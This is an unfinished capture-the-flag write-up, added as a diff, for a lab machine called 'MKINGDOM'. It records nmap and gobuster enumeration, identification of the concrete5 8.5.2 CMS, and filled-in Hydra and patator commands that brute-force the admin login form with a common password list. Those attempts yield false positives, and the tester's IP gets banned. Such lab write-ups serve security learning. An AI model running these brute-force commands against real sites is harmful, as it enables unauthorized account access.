@@ -1,0 +1,209 @@
+MKINGDOM.
+
+
+
+
+ENUMERATING: SERVICES:
+Quick nmap scan:
+nmap -sS -sV -T4 10.10.39.195
+OUTPUT:
+PORT   STATE SERVICE VERSION
+85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+
+
+
+Note:
+Since it isn't the default http port (80), we need to specify it in the url.
+EXPLORING: WEBSITE:
+Vising http://10.10.39.195:85/, bowser welcomes us.
+There ins't really anything on the landing site, neither on the source (CTRL + U), so we can move on.
+
+
+
+
+ENUMERATION: DIRECTORIES:
+Note:
+We will do a shorter scan, so we can start looking around, and a longer one to keep running in the background.
+Quick gobuster scan:
+gobuster dir -u http://10.10.39.195:85 -w /usr/share/dirb/wordlists/common.txt 
+OUTPUT:
+/.htpasswd            (Status: 403) [Size: 288]
+/.hta                 (Status: 403) [Size: 283]
+/.htaccess            (Status: 403) [Size: 288]
+/app                  (Status: 301) [Size: 312] [--> http://10.10.39.195:85/app/]
+/index.html           (Status: 200) [Size: 647]
+/server-status        (Status: 403) [Size: 292]
+
+
+Longer gobuster scan:
+gobuster dir -u http://10.10.39.195:85 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+Note:
+No new paths.
+
+
+
+
+EXPLORING: http://10.10.39.195:85/app/:
+A button with text "jump" is displayed. 
+We click it.
+OUTPUT:
+10.10.39.195:85 says
+Make yourself confortable and enjoy my place.
+Note:
+We get redirected to: http://10.10.39.195:85/app/castle/
+
+
+
+
+EXPLORING: http://10.10.39.195:85/app/castle/
+We start by inspecting source (CTRL + U):
+OUTPUT (SNIPPET 1):
+    var CCM_DISPATCHER_FILENAME = "/app/castle/index.php";
+    var CCM_CID = 1;
+    var CCM_EDIT_MODE = false;
+    var CCM_ARRANGE_MODE = false;
+    var CCM_IMAGE_PATH = "/app/castle/concrete/images";
+    var CCM_TOOLS_PATH = "/app/castle/index.php/tools/required";
+    var CCM_APPLICATION_URL = "http://10.10.39.195:85/app/castle";
+    var CCM_REL = "/app/castle";
+    var CCM_ACTIVE_LOCALE = "en_US";
+Note:
+/app/castle/concrete/images: has nothing other than images.
+/app/castle/index.php/tools/required: displayserror 404.
+OUTPUT (SNIPPET 2):
+<meta name="generator" content="concrete5 - 8.5.2"/>
+Note: 
+The CMS used is concrete5 v8.5.2.
+
+
+Exploring redirects:
+1. http://10.10.39.195:85/app/castle/index.php/blog:
+Blog section template.
+Clicking on the social media buttons (bottom on the page), still default, they redirect to Concrete5 (name used before Concrete CMS). Though this is already explicitly declared "Built with concrete5 CMS".
+2. http://10.10.39.195:85/app/castle/index.php/contact:
+Has a contact form.
+3. Other buttons: FAQ / Help, Case Studies, Another Link:
+Redirect to landing page.
+Note:
+It looks like our vector probably is the form, or something based on the version of the CMS.
+Doing some research, we find an rce exploit: https://hackerone.com/reports/768322.
+From the looks of it, we need to get admin access before doing the exploit. 
+So we are missing enumeration.
+
+
+
+
+SEARCHING FOR A LOGIN PORTAL:
+Gobuster file scan (in ip:port):
+gobuster dir -u http://10.10.39.195:85 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+Note:
+Forced termination. Explanation in note (1).
+
+
+
+Gobuster file scan (in ip:port/app):
+gobuster dir -u http://10.10.39.195:85/app -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+Note:
+Forced termination. Explanation in note (1).
+
+
+Note (1):
+Stupidly, we didn't spot a log in button displayed at the bottom right of the page, redirecting to: http://10.10.39.195:85/app/castle/index.php/login
+
+
+
+
+SIGN IN PORTAL:
+We try credential pair admin|admin.
+OUTPUT:
+Invalid username or password.
+Note:
+The error doesn't specify that the username admin exists, but it probably does, since the default concrete5 admin credentials are a username of admin and a password that is set during the installation process.
+To bruteforce hydra, we need to find some values first.
+
+
+Hydra post web form bruteforce:
+sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+
+Find username and password variable names:
+1. Open web inspector: CTRL + I.
+2. > Network
+3. Try random wrong credential pair (eg: wrong|wrong).
+4. Click "concrete" (post request sent when trying to log in).
+5. > Payload > Form Data > view source.
+OUTPUT:
+uName=wrong&uPassword=wrong&ccm_token=1753033009%3Af7ea10137673e2f7950f4fbb8ae55d02
+
+
+Find wrong login error message: 
+1. > Response.
+2. Look for error related messages.
+OUTPUT:
+ <div class="ccm-system-errors alert alert-danger alert-dismissable"><button type="button" class="close" data-dismiss="alert">×</button>
+                <div>Invalid username or password.</div>        	</div>
+Note:
+Error message is: Invalid username or password.
+
+
+Our filled in hydra command:
+sudo hydra -l admin -P ~/thm/rockyou.txt 10.10.39.195 -s 85 http-post-form "/app/castle/index.php/login/authenticate/concrete:uName=^USER^&uPassword=^PASS^&ccm_token=1753033009%3Af7ea10137673e2f7950f4fbb8ae55d02:Invalid username or password."
+OUTPUT:
+[85][http-post-form] host: 10.10.39.195   login: admin   password: rockyou
+[85][http-post-form] host: 10.10.39.195   login: admin   password: 12345678
+[85][http-post-form] host: 10.10.39.195   login: admin   password: princess
+[85][http-post-form] host: 10.10.39.195   login: admin   password: daniel
+[85][http-post-form] host: 10.10.39.195   login: admin   password: nicole
+[85][http-post-form] host: 10.10.39.195   login: admin   password: monkey
+[85][http-post-form] host: 10.10.39.195   login: admin   password: babygirl
+[85][http-post-form] host: 10.10.39.195   login: admin   password: iloveyou
+[85][http-post-form] host: 10.10.39.195   login: admin   password: lovely
+[85][http-post-form] host: 10.10.39.195   login: admin   password: jessica
+[85][http-post-form] host: 10.10.39.195   login: admin   password: 1234567
+[85][http-post-form] host: 10.10.39.195   login: admin   password: michael
+[85][http-post-form] host: 10.10.39.195   login: admin   password: ashley
+[85][http-post-form] host: 10.10.39.195   login: admin   password: qwerty
+[85][http-post-form] host: 10.10.39.195   login: admin   password: 654321
+[85][http-post-form] host: 10.10.39.195   login: admin   password: password
+Note:
+Looks like we got multiple passwords for admin (?)
+
+
+Try to log in:
+We use pair admin|rockyou.
+OUTPUT:
+Unable to complete action: your IP address has been banned. Please contact the administrator of this site for more information.
+Note:
+Even if we weren't blocked, it wouldn't work, since 2 or more valid passwords in the output means we have false positives.
+
+
+Note:
+New ip 10.10.208.149 due to machine reboot.
+We try to run other tools such as wfuzz, but we also get positives.
+It looks like the site always sends the a reply with the same size, and status 200.
+Proof of 200 replies:
+patator http_fuzz url=http://10.10.208.149:85/app/castle/index.php/login/authenticate/concrete method=POST body='uName=admin&uPassword=FILE0' 0=~/thm/rockyou.txt -x ignore:fgrep='Invalid username or password.'
+OUTPUT:
+18:57:11 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+18:57:11 patator    INFO - -----------------------------------------------------------------------------
+18:57:12 patator    INFO - 200  10169:-1       0.683 | 123456                             |     1 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.680 | 12345                              |     2 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.678 | 123456789                          |     3 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.674 | password                           |     4 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.672 | iloveyou                           |     5 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.657 | princess                           |     6 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.654 | 1234567                            |     7 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.613 | rockyou                            |     8 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.654 | 12345678                           |     9 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.642 | abc123                             |    10 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.671 | nicole                             |    11 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.663 | daniel                             |    12 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.612 | babygirl                           |    13 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.636 | monkey                             |    14 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.664 | lovely                             |    15 | HTTP/1.1 200 OK
+18:57:12 patator    INFO - 200  10169:-1       0.672 | jessica 
+...
+
+
+Note:
+Since the ccm_token value renews with each login attempt, we will try to 
